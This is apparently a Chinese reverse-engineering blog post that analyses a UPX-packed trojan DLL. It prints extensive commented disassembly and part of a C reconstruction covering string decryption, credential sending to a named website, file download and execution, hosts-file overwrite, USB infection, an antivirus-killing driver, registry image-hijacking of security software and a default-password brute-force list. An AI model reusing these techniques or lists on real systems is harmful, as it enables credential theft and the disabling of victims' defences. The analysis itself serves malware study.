
# 一个木马简单样本分析

> 原文：[`www.pediy.com/kssd/pediy12/134778.html`](https://www.pediy.com/kssd/pediy12/134778.html)

逆向了一个函数，详细分析了一个线程，具体请查看 `idb` 文件，本来整理好了的，拿错了文件，有些地方请忽视

小总结一下：映像劫持安全软件，下载文件，感染 `U` 盘，执行病毒，磁盘扫描等等！代码太多，大概的看了一下。

```
UPX0:1000332A  ; DWORD __stdcall sub_1000332A(LPVOID)

UPX0:1000332A sub_1000332A    proc near               ; DATA XREF: DllMain(x,x,x)+17o

UPX0:1000332A 

UPX0:1000332A SystemTime      = _SYSTEMTIME ptr -15Ch 

UPX0:1000332A var_14C         = byte ptr -14Ch 

UPX0:1000332A var_144         = word ptr -144h 

UPX0:1000332A hFile           = dword ptr -13Ch 

UPX0:1000332A var_138         = dword ptr -138h 

UPX0:1000332A var_134         = dword ptr -134h 

UPX0:1000332A Dst             = byte ptr -130h 

UPX0:1000332A hObject         = dword ptr -28h 

UPX0:1000332A lpBuffer        = dword ptr -24h 

UPX0:1000332A hHandle         = dword ptr -20h 

UPX0:1000332A var_1C          = byte ptr -1Ch 

UPX0:1000332A var_18          = dword ptr -18h 

UPX0:1000332A var_10          = dword ptr -10h 

UPX0:1000332A var_4           = dword ptr -4 

UPX0:1000332A 

UPX0:1000332A                 push    ebp 

UPX0:1000332B                 mov     ebp, esp 

UPX0:1000332D                 push    0FFFFFFFFh      ; lpOverlapped 

UPX0:1000332F                 push    offset NumberOfBytesWritten ; lpNumberOfBytesWritten 

UPX0:10003334                 push    offset loc_10005E70 

UPX0:10003339                 mov     eax, large fs:0 

UPX0:1000333F                 push    eax 

UPX0:10003340                 mov     large fs:0, esp 

UPX0:10003347                 push    ecx 

UPX0:10003348                 push    ecx 

UPX0:10003349                 sub     esp, 144h 

UPX0:1000334F                 push    ebx             ; cbInData 

UPX0:10003350                 push    esi             ; fOAEP 

UPX0:10003351                 push    edi             ; hCrypto 

UPX0:10003352                 mov     [ebp-18h], esp 

UPX0:10003355                 push    offset a4f9e860c9be947 ; "4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B" 

UPX0:1000335A                 push    0               ; bInitialState 

UPX0:1000335C                 push    1               ; bManualReset 

UPX0:1000335E                 push    0               ; lpEventAttributes 

UPX0:10003360                 call    CreateEventA 

UPX0:10003366                 mov     dword_10009480, eax 

UPX0:1000336B                 cmp     dword_10009480, 0 

UPX0:10003372                 jz      short loc_10003381 

UPX0:10003374                 call    GetLastError 

UPX0:1000337A                 cmp     eax, ERROR_ALREADY_EXISTS 

UPX0:1000337F                 jnz     short loc_10003389 

UPX0:10003381 

UPX0:10003381 loc_10003381:                     ; CODE XREF: sub_1000332A+48j 

UPX0:10003381                 push    0               ; dwExitCode 

UPX0:10003383                 call    ExitThread 

UPX0:10003389 ; --------------------------------------------------------------------------- 

UPX0:10003389 

UPX0:10003389 loc_10003389:                     ; CODE XREF: sub_1000332A+55j 

UPX0:10003389                 and     dword ptr [ebp-4], 0 

UPX0:1000338D                 call    Encrypt        ; 主要执行解密一些东西和一个网络地址，看代码一！我把这函数给逆了 

UPX0:10003392                 or      dword ptr [ebp-4], 0FFFFFFFFh 

UPX0:10003396                 jmp     short loc_100033A3 

UPX0:10003398 ; --------------------------------------------------------------------------- 

UPX0:10003398 

UPX0:10003398 loc_10003398:                     ; DATA XREF: UPX0:10006D1Co 

UPX0:10003398                 xor     eax, eax 

UPX0:1000339A                 inc     eax 

UPX0:1000339B                 retn 

UPX0:1000339C ; --------------------------------------------------------------------------- 

UPX0:1000339C 

UPX0:1000339C loc_1000339C:                     ; DATA XREF: UPX0:10006D1Co 

UPX0:1000339C                 mov     esp, [ebp-18h] 

UPX0:1000339F                 or      dword ptr [ebp-4], 0FFFFFFFFh 

UPX0:100033A3 

UPX0:100033A3 loc_100033A3:                     ; CODE XREF: sub_1000332A+6Cj 

UPX0:100033A3                 push    0 

UPX0:100033A5                 push    0 

UPX0:100033A7                 push    0 

UPX0:100033A9                 push    offset sub_10003F33 ; 和网络相关，主要是执行马和发送一些计算机信息到指定站点上，看反汇编代码二！ 

UPX0:100033AE                 push    0 

UPX0:100033B0                 push    0 

UPX0:100033B2                 call    CreateThread 

UPX0:100033B8                 push    0 

UPX0:100033BA                 push    0 

UPX0:100033BC                 push    0 

UPX0:100033BE                 push    offset sub_100018D7 ; 和文件相关，下载文件，创建文件，加载文件啥的 

UPX0:100033C3                 push    0 

UPX0:100033C5                 push    0 

UPX0:100033C7                 call    CreateThread 

UPX0:100033CD                 mov     [ebp+hHandle], eax 

UPX0:100033D0                 push    0 

UPX0:100033D2                 push    0 

UPX0:100033D4                 push    0 

UPX0:100033D6                 push    offset sub_10003A8D ; 判断是否加载了驱动，加载了就是用了某个函数的 B 号功能以及导出 SSDT 那个结构，否者加载驱动 

UPX0:100033DB                 push    0 

UPX0:100033DD                 push    0 

UPX0:100033DF                 call    CreateThread 

UPX0:100033E5                 push    0 

UPX0:100033E7                 push    0 

UPX0:100033E9                 push    0 

UPX0:100033EB                 push    offset sub_10004618 ; 主要是和注册表有关，映像劫持杀软，设置自己的驱动启动方式 

UPX0:100033F0                 push    0 

UPX0:100033F2                 push    0 

UPX0:100033F4                 call    CreateThread 

UPX0:100033FA 

UPX0:100033FA loc_100033FA:                     ; CODE XREF: sub_1000332A+109j 

UPX0:100033FA                 xor     eax, eax 

UPX0:100033FC                 inc     eax 

UPX0:100033FD                 jz      short loc_10003435 

UPX0:100033FF                 call    GetTickCount  ; 获得系统启动的时间 

UPX0:10003405                 mov     [ebp-134h], eax 

UPX0:1000340B                 mov     eax, [ebp-134h] 

UPX0:10003411                 xor     edx, edx 

UPX0:10003413                 mov     ecx, 1000 

UPX0:10003418                 div     ecx             ; 除以 1000，得到秒数 

UPX0:1000341A                 xor     edx, edx 

UPX0:1000341C                 push    60 

UPX0:1000341E                 pop     ecx 

UPX0:1000341F                 div     ecx             ; 再除以 60，得到分钟数 

UPX0:10003421                 cmp     eax, 3          ; 比较是否小于 3 分钟 

UPX0:10003424                 jb      short loc_10003428 

UPX0:10003426                 jmp     short loc_10003435 ; 继续执行 

UPX0:10003428 ; --------------------------------------------------------------------------- 

UPX0:10003428 

UPX0:10003428 loc_10003428:                     ; CODE XREF: sub_1000332A+FAj 

UPX0:10003428                 push    3E8h            ; dwMilliseconds 

UPX0:1000342D                 call    Sleep 

UPX0:10003433                 jmp     short loc_100033FA 

UPX0:10003435 ; --------------------------------------------------------------------------- 

UPX0:10003435 

UPX0:10003435 loc_10003435:                     ; CODE XREF: sub_1000332A+D3j 

UPX0:10003435                             ; sub_1000332A+FCj 

UPX0:10003435                 push    104h            ; 初始化的大小 

UPX0:1000343A                 push    0               ; 被设置的字符 

UPX0:1000343C                 lea     eax, [ebp+Dst] 

UPX0:10003442                 push    eax             ; 初始化的起始偏移地址 

UPX0:10003443                 call    memset 

UPX0:10003448                 add     esp, 0Ch 

UPX0:1000344B                 push    104h            ; 缓冲区大小 

UPX0:10003450                 lea     eax, [ebp+Dst]
```



# 汇编代码分析

## 初始化 Hosts 文件操作

```
UPX0:10003456           push    eax          ; 缓冲区  
UPX0:10003457           call    GetSystemDirectoryA ; 得到系统所在目录的路径  
UPX0:1000345D           push    offset aDriversEtcHost ; "\\\\drivers\\\\etc\\\\hosts"  
UPX0:10003462           lea     eax, [ebp+Dst]  ; 系统目录的路径，C:\\\windows\\\\  
UPX0:10003468           push    eax  
UPX0:10003469           call    lstrcat        ; 把他们接上得到完整路径，C:\\WINDOWS\\\\drivers\\\\etc\\\\hosts  
UPX0:1000346F           push    0            ; 模板文件的句柄  
UPX0:10003471           push    80h          ; 文件的标志和属性  
UPX0:10003476           push    3            ; 创建文件的方式  
UPX0:10003478           push    0            ; 安全标志  
UPX0:1000347A           push    3            ; 共享模式  
UPX0:1000347C           push    0C000000h     ; 访问标志  
UPX0:10003481           lea     eax, [ebp+Dst]  
UPX0:10003487           push    eax          ; 文件的名称  
UPX0:10003488           call    CreateFileA  
UPX0:1000348E           mov     [ebp+hObject], eax ; 返回值放入这里 hObject  
UPX0:10003491           mov     [ebp+lpBuffer], offset a127_0_0_1Local ; "127.0.0.1       localhost\r\n"  
UPX0:10003498           push    0            ; WriteFile 的参数  
UPX0:1000349A           lea     eax, [ebp-1Ch]  
UPX0:1000349D           push    eax  
UPX0:1000349E           push    [ebp+lpBuffer]  ; 上面的字符串  
UPX0:100034A1           call    lstrlen         ; 测试上面字符串的长度  
UPX0:100034A7           push    eax          ; nNumberOfBytesToWrite  
UPX0:100034A8           push    [ebp+lpBuffer]  ; lpBuffer  
UPX0:100034AB           push    [ebp+hObject]   ; hFile  
UPX0:100034AE           call    WriteFile       ; 写入上面的字符串到创建的文件  
UPX0:100034B4           push    [ebp+hObject]  
UPX0:100034B7           call    SetEndOfFile    ; 设置文件结束  
UPX0:100034BD           push    [ebp+hObject]  
UPX0:100034C0           call    CloseHandle     ; 关闭文件句柄  
```

## 内存初始化与 DllCache 路径构建

```
UPX0:100034C6           push    104h          ; 初始化大小  
UPX0:100034CB           push    0            ; 设置的字符串  
UPX0:100034CD           push    offset FileName ; 初始化的起始偏移地址  
UPX0:100034D2           call    memset  
UPX0:100034D7           add     esp, 0Ch  
UPX0:100034DA           push    104h          ; 缓冲区大小  
UPX0:100034DF           push    offset FileName ; 缓冲区  
UPX0:100034E4           call    GetSystemDirectoryA ; 获得系统目录的路径  
UPX0:100034EA           push    offset aDllcacheSystem ; "\\\\dllcache\\\\systembox.bak"  
UPX0:100034EF           push    offset FileName ; 系统路径 C:\\Windows  
UPX0:100034F4           call    lstrcat         ; 上面的字符串接上，得到一个完整的路径  
UPX0:100034FA           and     dword ptr [ebp-138h], 0 ; 这里放入 0  
UPX0:10003501           jmp     short loc_10003510  
UPX0:10003503 ; ---------------------------------------------------------------------------  
UPX0:10003503  
UPX0:10003503 loc_10003503:                   ; CODE XREF: sub_1000332A+244j  
UPX0:10003503           mov     eax, [ebp-138h]  
UPX0:10003509           inc     eax  
UPX0:1000350A           mov     [ebp-138h], eax  
UPX0:10003510  
UPX0:10003510 loc_10003510:                   ; CODE XREF: sub_1000332A+1D7j  
UPX0:10003510           cmp     dword ptr [ebp-138h], 100 ; 比较是否大于或等于 100  
UPX0:10003517           jge     short loc_10003570 ; 大于等于 100 就跳，不然重复执行下面 100 次  
UPX0:10003519           push    0  
UPX0:1000351B           push    80h  
UPX0:10003520           push    3  
UPX0:10003522           push    0  
UPX0:10003524           push    0  
UPX0:10003526           push    80000000h  
UPX0:1000352B           push    offset FileName  
UPX0:10003530           call    CreateFileA     ; 创建文件  
UPX0:10003536           mov     [ebp+hFile], eax ; 返回值放到这里  
UPX0:1000353C           cmp     [ebp+hFile], 0FFFFFFFFh ; 比较返回值是否为-1  
UPX0:10003543           jz      short loc_10003566 ; 等于-1 就跳  
UPX0:10003545           push    0            ; lpFileSizeHigh  
UPX0:10003547           push    [ebp+hFile]     ; hFile  
UPX0:1000354D           call    GetFileSize     ; 获得文件的大小  
UPX0:10003553           mov     nNumberOfBytesToWrite, eax ; 文件大小的返回值放入这里  
UPX0:10003558           push    [ebp+hFile]     ; hObject  
UPX0:1000355E           call    CloseHandle     ; 关闭文件句柄  
UPX0:10003564           jmp     short loc_10003570  
UPX0:10003566 ; ---------------------------------------------------------------------------  
UPX0:10003566  
UPX0:10003566 loc_10003566:                   ; CODE XREF: sub_1000332A+219j  
UPX0:10003566           push    64h           ; dwMilliseconds  
UPX0:10003568           call    Sleep  
UPX0:1000356E           jmp     short loc_10003503  
UPX0:10003570 ; ---------------------------------------------------------------------------  
UPX0:10003570  
UPX0:10003570 loc_10003570:                   ; CODE XREF: sub_1000332A+1EDj  
UPX0:10003570                                     ; sub_1000332A+23Aj  
UPX0:10003570           cmp     nNumberOfBytesToWrite, 0  
UPX0:10003577           jbe     loc_10003672    ; 判断返回值的状态  
UPX0:1000357D           cmp     nNumberOfBytesToWrite, 0FFFFFFFFh  
UPX0:10003584           jz      loc_10003672    ; 判断返回值的状态  
UPX0:1000358A           push    0  
UPX0:1000358C           push    80h  
UPX0:10003591           push    3  
UPX0:10003593           push    0  
UPX0:10003595           push    1  
UPX0:10003597           push    80000000h  
UPX0:1000359C           push    offset FileName  
UPX0:100035A1           call    CreateFileA     ; 创建文件  
UPX0:100035A7           mov     hFile, eax  
UPX0:100035AC           push    0  
UPX0:100035AE           push    0  
UPX0:100035B0           push    0  
UPX0:100035B2           push    2  
UPX0:100035B4           push    0  
UPX0:100035B6           push    hFile  
UPX0:100035BC           call    CreateFileMappingA ; 创建文件映射  
UPX0:100035C2           mov     hFileMappingObject, eax  
UPX0:100035C7           push    0  
UPX0:100035C9           push    0  
UPX0:100035CB           push    0  
UPX0:100035CD           push    4  
UPX0:100035CF           push    hFileMappingObject  
UPX0:100035D5           call    MapViewOfFile   ; 映射文件  
UPX0:100035DB           mov     lpBuffer, eax   ; 映射文件的返回值放到 lpBuffer  
UPX0:100035E0           cmp     dword_10008454, 0  
UPX0:100035E7           jz      short loc_10003607  
UPX0:100035E9           cmp     lpBuffer, 0     ; 比较返回值是否为 0  
UPX0:100035F0           jz      short loc_10003607 ; 等于 0 就跳，不然创建一个线程  
UPX0:100035F2           push    0  
UPX0:100035F4           push    0  
UPX0:100035F6           push    0  
UPX0:100035F8           push    offset sub_1000311F ; 磁盘操作，扫描制定格式文件  
UPX0:100035FD           push    0  
UPX0:100035FF           push    0  
UPX0:10003601           call    CreateThread  
UPX0:10003607  
UPX0:10003607 loc_10003607:                   ; CODE XREF: sub_1000332A+2BDj  
UPX0:10003607                                     ; sub_1000332A+2C6j  
UPX0:10003607           cmp     dword_10008460, 0  
UPX0:1000360E           jz      short loc_10003628  
UPX0:10003610           push    0  
UPX0:10003612           push    0  
UPX0:10003614           push    offset aLan      ; "LAN"  
```



```asm
UPX0:10003619                 push    offset sub_10005265 ; 不知道要干啥呢  
UPX0:1000361E                 push    0  
UPX0:10003620                 push    0  
UPX0:10003622                 call    CreateThread  

UPX0:10003628  

UPX0:10003628 loc_10003628:                      ; CODE XREF: sub_1000332A+2E4j  
UPX0:10003628                 cmp     dword_1000845C, 0  
UPX0:1000362F                 jz      short loc_10003646  
UPX0:10003631                 push    0  
UPX0:10003633                 push    0  
UPX0:10003635                 push    0  
UPX0:10003637                 push    offset sub_100058E1 ; 感染可移动磁盘，向里面写入文件啥的，  
UPX0:10003637                                  ; 和隐藏文件啥的，反正就一般般的东东  
UPX0:1000363C                 push    0  
UPX0:1000363E                 push    0  
UPX0:10003640                 call    CreateThread  
UPX0:10003646  

UPX0:10003646 loc_10003646:                      ; CODE XREF: sub_1000332A+305j  
UPX0:10003646                 push    0FFFFFFFFh     ; dwMilliseconds  
UPX0:10003648                 push    [ebp+hHandle]   ; hHandle  
UPX0:1000364B                 call    WaitForSingleObject  
UPX0:10003651                 cmp     dword_10008464, 0  
UPX0:10003658                 jz      short loc_10003672  
UPX0:1000365A                 push    0  
UPX0:1000365C                 push    0  
UPX0:1000365E                 push    offset aInternet ; "Internet"  
UPX0:10003663                 push    offset sub_10005265 ; 不知道要干啥呢  
UPX0:10003668                 push    0  
UPX0:1000366A                 push    0  
UPX0:1000366C                 call    CreateThread  
UPX0:10003672  

UPX0:10003672 loc_10003672:                      ; CODE XREF: sub_1000332A+24Dj  
UPX0:10003672                                  ; sub_1000332A+25Aj ...  
UPX0:10003672                 cmp     dword_10008468, 0  
UPX0:10003679                 jz      short loc_100036A4  
UPX0:1000367B                 push    1  
UPX0:1000367D                 movzx   eax, word_10008450  
UPX0:10003684                 push    eax  
UPX0:10003685                 call    sub_1000116C   ; 和文件相关，下载文件啥的  
UPX0:1000368A                 cmp     eax, 1  
UPX0:1000368D                 jnz     short loc_100036A4  
UPX0:1000368F                 push    0  
UPX0:10003691                 push    0  
UPX0:10003693                 push    0  
UPX0:10003695                 push    offset sub_10005ACB ; 执行一个.exe 文件  
UPX0:1000369A                 push    0  
UPX0:1000369C                 push    0  
UPX0:1000369E                 call    CreateThread  
UPX0:100036A4  

UPX0:100036A4 loc_100036A4:                      ; CODE XREF: sub_1000332A+34Fj  
UPX0:100036A4                                  ; sub_1000332A+363j  
UPX0:100036A4                 cmp     dword_1000846C, 0  
UPX0:100036AB                 jz      short loc_10003728  
UPX0:100036AD                 lea     eax, [ebp+SystemTime]  
UPX0:100036B3                 push    eax        ; lpSystemTime  
UPX0:100036B4                 call    GetLocalTime  
UPX0:100036BA  

UPX0:100036BA loc_100036BA:                      ; CODE XREF: sub_1000332A+3FCj  
UPX0:100036BA                 xor     eax, eax  
UPX0:100036BC                 inc     eax  
UPX0:100036BD                 jz      short loc_10003728  
UPX0:100036BF                 lea     eax, [ebp+var_14C]  
UPX0:100036C5                 push    eax        ; lpSystemTime  
UPX0:100036C6                 call    GetLocalTime  
UPX0:100036CC                 movzx   eax, [ebp+var_144]  
UPX0:100036D3                 movzx   ecx, [ebp+SystemTime.wHour]  
UPX0:100036DA                 sub     eax, ecx  
UPX0:100036DC                 cmp     eax, dword_1000846C  
UPX0:100036E2                 jl      short loc_1000371B  
UPX0:100036E4                 mov     ax, [ebp+var_144]  
UPX0:100036EB                 mov     [ebp+SystemTime.wHour], ax  
UPX0:100036F2                 push    1  
UPX0:100036F4                 movzx   eax, word_10008450  
UPX0:100036FB                 push    eax  
UPX0:100036FC                 call    sub_1000116C   ; 和文件相关，下载文件啥的  
UPX0:10003701                 cmp     eax, 1  
UPX0:10003704                 jnz     short loc_1000371B  
UPX0:10003706                 push    0        ; lpThreadId  
UPX0:10003708                 push    0  
UPX0:1000370A                 push    0  
UPX0:1000370C                 push    offset sub_10005ACB ; 执行一个。.exe  
UPX0:10003711                 push    0  
UPX0:10003713                 push    0  
UPX0:10003715                 call    CreateThread  
UPX0:1000371B  

UPX0:1000371B loc_1000371B:                      ; CODE XREF: sub_1000332A+3B8j  
UPX0:1000371B                                  ; sub_1000332A+3DAj  
UPX0:1000371B                 push    0EA60h     ; dwMilliseconds  
UPX0:10003720                 call    Sleep  
UPX0:10003726                 jmp     short loc_100036BA  
UPX0:10003728 ; -------------------------------------------------------------------------  
UPX0:10003728  

UPX0:10003728 loc_10003728:                      ; CODE XREF: sub_1000332A+381j  
UPX0:10003728                                  ; sub_1000332A+393j ...  
UPX0:10003728                 xor     eax, eax  
UPX0:1000372A                 inc     eax  
UPX0:1000372B                 jz      short loc_1000373A  
UPX0:1000372D                 push    2710h     ; dwMilliseconds  
UPX0:10003732                 call    Sleep  
UPX0:10003738                 jmp     short loc_10003728  
UPX0:1000373A ; -------------------------------------------------------------------------  
UPX0:1000373A  

UPX0:1000373A loc_1000373A:                      ; CODE XREF: sub_1000332A+401j  
UPX0:1000373A                 xor     eax, eax  
UPX0:1000373C                 mov     ecx, [ebp+var_10]  
UPX0:1000373F                 mov     large fs:0, ecx  
UPX0:10003746                 pop     edi  
UPX0:10003747                 pop     esi  
UPX0:10003748                 pop     ebx  
UPX0:10003749                 leave  
UPX0:1000374A                 retn    4  
UPX0:1000374A sub_1000332A    endp
```

## 代码一

程序开始创建一个互斥判断是否存在客户端，不存在就解密一些地址和一些数据

相关反汇编代码如下：

```asm
UPX0:1000374D ; void Encrypt(void)
UPX0:1000374D Encrypt         proc near                 ; CODE XREF: sub_1000332A+63p
UPX0:1000374D
UPX0:1000374D var_6           = byte ptr -6
UPX0:1000374D var_5           = byte ptr -5
UPX0:1000374D var_4           = dword ptr -4
UPX0:1000374D hCrypto         = dword ptr  8
UPX0:1000374D fOAEP           = dword ptr  0Ch
UPX0:1000374D cbInData        = dword ptr  10h
UPX0:1000374D pInData         = dword ptr  14h
UPX0:1000374D pcbOutData      = dword ptr  18h
UPX0:1000374D ppOutData       = dword ptr  1Ch
UPX0:1000374D
UPX0:1000374D                 push    ebp
UPX0:1000374E                 mov     ebp, esp
UPX0:10003750                 push    ecx
UPX0:10003751                 push    ecx
UPX0:10003752                 and     dword ptr [ebp-4], 0
UPX0:10003756                 push    dword_10008480  ; dwMilliseconds
UPX0:1000375C                 call    Sleep
UPX0:10003762                 push    64          ; Size
UPX0:10003764                 push    0         ; Val
UPX0:10003766                 push    offset byte_10009430 ; Dst
UPX0:1000376B                 call    memset      ; 初始化全局变量 byte_10009430
UPX0:10003770                 add     esp, 0Ch
UPX0:10003773                 push    256       ; Size
UPX0:10003778                 push    0         ; Val
```



# 汇编代码分析

```
UPX0:1000377A                    push    offset dword_10009228 ; Dst  

UPX0:1000377F                    call    memset          ; 初始化全局变量 dword_10009228  

UPX0:10003784                    add     esp, 0Ch  

UPX0:10003787                    mov     dword ptr [ebp-4], offset dword_10008488  

UPX0:1000378E  

UPX0:1000378E StartEncrypt:                      ; CODE XREF: Encrypt+76j  

UPX0:1000378E                    mov     eax, [ebp-4]  

UPX0:10003791                    movsx   eax, byte ptr [eax] ; 从 EAX 里面取出一字节扩展到 EAX  

UPX0:10003794                    test    eax, eax        ; 判断 EAX 是否为 0  

UPX0:10003796                    jz      short loc_100037C5 ; 等于 0 就跳  

UPX0:10003798                    mov     eax, [ebp-4]    ; 再次取出 EBP-4 的内容放到 EAX  

UPX0:1000379B                    mov     al, [eax]       ; 取出以为放到 AL 里面  

UPX0:1000379D                    mov     [ebp-5], al     ; AL 的内容放到 EBP-5 里面去  

UPX0:100037A0                    mov     al, [ebp-5]     ; 然后取出 EBP-5 的一字节放到 AL 里面去  

UPX0:100037A3                    sub     al, 1           ; AL 减去 1  

UPX0:100037A5                    mov     [ebp-5], al     ; AL 放回 EBP-5 里面去  

UPX0:100037A8                    movsx   eax, byte ptr [ebp-5] ; 取出 EBP-5 的内容扩展后放到 EAX  

UPX0:100037AC                    xor     eax, 0A5h       ; EAX 和 0xA5 异或  

UPX0:100037B1                    mov     [ebp-5], al  

UPX0:100037B4                    mov     eax, [ebp-4]  

UPX0:100037B7                    mov     cl, [ebp-5]  

UPX0:100037BA                    mov     [eax], cl  

UPX0:100037BC                    mov     eax, [ebp-4]  

UPX0:100037BF                    inc     eax  

UPX0:100037C0                    mov     [ebp-4], eax  

UPX0:100037C3                    jmp     short StartEncrypt  

UPX0:100037C5 ; -------------------------------------------------------------  

UPX0:100037C5  

UPX0:100037C5 loc_100037C5:                      ; CODE XREF: Encrypt+49j  

UPX0:100037C5                    mov     dword ptr [ebp-4], offset dword_100084D0  

UPX0:100037CC  

UPX0:100037CC loc_100037CC:                      ; CODE XREF: Encrypt+B4j  

UPX0:100037CC                    mov     eax, [ebp-4]  

UPX0:100037CF                    movsx   eax, byte ptr [eax]  

UPX0:100037D2                    test    eax, eax  

UPX0:100037D4                    jz      short loc_10003803  

UPX0:100037D6                    mov     eax, [ebp-4]  

UPX0:100037D9                    mov     al, [eax]  

UPX0:100037DB                    mov     [ebp-6], al  

UPX0:100037DE                    mov     al, [ebp-6]  

UPX0:100037E1                    sub     al, 1  

UPX0:100037E3                    mov     [ebp-6], al  

UPX0:100037E6                    movsx   eax, byte ptr [ebp-6]  

UPX0:100037EA                    xor     eax, 0A5h  

UPX0:100037EF                    mov     [ebp-6], al  

UPX0:100037F2                    mov     eax, [ebp-4]  

UPX0:100037F5                    mov     cl, [ebp-6]  

UPX0:100037F8                    mov     [eax], cl  

UPX0:100037FA                    mov     eax, [ebp-4]  

UPX0:100037FD                    inc     eax  

UPX0:100037FE                    mov     [ebp-4], eax  

UPX0:10003801                    jmp     short loc_100037CC  

UPX0:10003803 ; -------------------------------------------------------------  

UPX0:10003803  

UPX0:10003803 loc_10003803:                      ; CODE XREF: Encrypt+87j  

UPX0:10003803                    mov     dword ptr [ebp-4], offset aNAdministrator ; "n,Administrator,Guest,admin,Root,"  

UPX0:1000380A  

UPX0:1000380A loc_1000380A:                      ; CODE XREF: Encrypt+DFj  

UPX0:1000380A                    mov     eax, [ebp-4]  

UPX0:1000380D                    movsx   eax, byte ptr [eax]  

UPX0:10003810                    test    eax, eax  

UPX0:10003812                    jz      short loc_1000382E  

UPX0:10003814                    mov     eax, [ebp-4]  

UPX0:10003817                    movsx   eax, byte ptr [eax]  

UPX0:1000381A                    cmp     eax, 2Ch  

UPX0:1000381D                    jnz     short loc_10003825  

UPX0:1000381F                    mov     eax, [ebp-4]  

UPX0:10003822                    mov     byte ptr [eax], 0  

UPX0:10003825  

UPX0:10003825 loc_10003825:                      ; CODE XREF: Encrypt+D0j  

UPX0:10003825                    mov     eax, [ebp-4]  

UPX0:10003828                    inc     eax  

UPX0:10003829                    mov     [ebp-4], eax  

UPX0:1000382C                    jmp     short loc_1000380A  

UPX0:1000382E ; -------------------------------------------------------------  

UPX0:1000382E  

UPX0:1000382E loc_1000382E:                      ; CODE XREF: Encrypt+C5j  

UPX0:1000382E                    mov     dword ptr [ebp-4], offset aN1234Password6 ; "n,1234,password,6969,harley,123456,golf"...  

UPX0:10003835  

UPX0:10003835 loc_10003835:                      ; CODE XREF: Encrypt+10Aj  

UPX0:10003835                    mov     eax, [ebp-4]  

UPX0:10003838                    movsx   eax, byte ptr [eax]  

UPX0:1000383B                    test    eax, eax  

UPX0:1000383D                    jz      short loc_10003859  

UPX0:1000383F                    mov     eax, [ebp-4]  

UPX0:10003842                    movsx   eax, byte ptr [eax]  

UPX0:10003845                    cmp     eax, 2Ch  

UPX0:10003848                    jnz     short loc_10003850  

UPX0:1000384A                    mov     eax, [ebp-4]  

UPX0:1000384D                    mov     byte ptr [eax], 0  

UPX0:10003850  

UPX0:10003850 loc_10003850:                      ; CODE XREF: Encrypt+FBj  

UPX0:10003850                    mov     eax, [ebp-4]  

UPX0:10003853                    inc     eax  

UPX0:10003854                    mov     [ebp-4], eax  

UPX0:10003857                    jmp     short loc_10003835  

UPX0:10003859 ; -------------------------------------------------------------  

UPX0:10003859  

UPX0:10003859 loc_10003859:                      ; CODE XREF: Encrypt+F0j  

UPX0:10003859                    mov     dword ptr [ebp-4], offset a360hotfix_exe3 ; "360hotfix.exe|360rpt.exe|360safe.exe|36"...  

UPX0:10003860  

UPX0:10003860 loc_10003860:                      ; CODE XREF: Encrypt+140j  

UPX0:10003860                    mov     eax, [ebp-4]  

UPX0:10003863                    movsx   eax, byte ptr [eax]  

UPX0:10003866                    test    eax, eax  

UPX0:10003868                    jz      short locret_1000388F  

UPX0:1000386A                    mov     eax, [ebp-4]  

UPX0:1000386D                    movsx   eax, byte ptr [eax]  

UPX0:10003870                    cmp     eax, 7Ch  

UPX0:10003873                    jz      short loc_10003880  

UPX0:10003875                    mov     eax, [ebp-4]  

UPX0:10003878                    movsx   eax, byte ptr [eax]  

UPX0:1000387B                    cmp     eax, 2Ch  

UPX0:1000387E                    jnz     short loc_10003886  

UPX0:10003880  

UPX0:10003880 loc_10003880:                      ; CODE XREF: Encrypt+126j  

UPX0:10003880                    mov     eax, [ebp-4]  

UPX0:10003883                    mov     byte ptr [eax], 0  

UPX0:10003886  

UPX0:10003886 loc_10003886:                      ; CODE XREF: Encrypt+131j  

UPX0:10003886                    mov     eax, [ebp-4]  

UPX0:10003889                    inc     eax  

UPX0:1000388A                    mov     [ebp-4], eax  

UPX0:1000388D                    jmp     short loc_10003860  

UPX0:1000388F ; -------------------------------------------------------------  

UPX0:1000388F  

UPX0:1000388F locret_1000388F:                   ; CODE XREF: Encrypt+11Bj  

UPX0:1000388F                    leave  

UPX0:10003890                    retn  

UPX0:10003890 Encrypt         endp  
```

这部分代码我写出来了，大家可以看下。

## 第二，大线程一之小线程 1

执行下载任务，连接网站，发送登录帐号和密码。

地址如下：`http://www.dy2004.com/msn/mm.htm`

### 小线程 2

下载上面解密的文本文档，然后又对`Explorer.exe`执行了一些操作，应该是判断启动进程以便注入。



### 小线程 3

创建一个驱动服务，名为 `WmiSvc.sys`，隐藏在 `system32\drivers` 目录下面。使用 `CreateFile` 创建 `\\.\NtBox`，`\\.\NtBox` 是和驱动通信的特征码！

`CreateFile` 成功后，判断了一个地址是否为 0，不为 0 就使用 `NtQuerySystemInformation` 的 11 号功能，Ring3 导出了 `KeServiceDescriptorTable`；

还有判断进程的杀毒名字，就是上面解密 1 那些软件名字，跳过对 `AVP` 的判断，然后扫描进程。

存在进程就使用 `DeviceIoControl` 来对抗杀软！`DeviceIoControl` 的 MSDN 上面的解释：

通过发送 `IOCTL` 来控制指定驱动服务，让他们完成指定的操作！

This function sends an `IOCTL` directly to a specified device driver, causing the corresponding device to perform the specified operation.

### 小线程 4

把注册表里面的驱动启动部分改为 2，2 不知道是什么启动，好像有个自启动吧，设置为 0 还是 1 哦。

注册表操作，映像劫持杀软，把下面的软件名字在注册表这个位置 `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution` 设置为 `ntsd -s`，就映像劫持这些软件了。

然后设置为调试状态。这个位置还使用了一些函数：

```
PX0:1000477E call sub_100044C9
```

使用 `WNetAddConnection2A` 和虚拟机连接上，又使用 `SetFileAttributesA` 来隐藏文件。

```c
#pragma comment(lib,"Ws2_32.lib")

#include <Windows.h>

char VariableA[64];

unsigned long VariableB[256];

char KeyA[]={"我抑佑撬勺缮抟"};     //解密网页地址的 Key，上面的是 16 进制的 Key，

char KeyB[]={"n,Administrator,Guest,admin,Root,"};

char KeyC[]={"n,1234,password,6969,harley,123456,golf,pussy,mustang,1111,shadow,1313,fish,5150,7777,qwerty,baseball,2112,letmein,12345678,12345,ccc,admin,5201314,qq520,1,12,123,1234567,123456789,654321,54321,111,000000,abc,pw,11111111,8888,"};

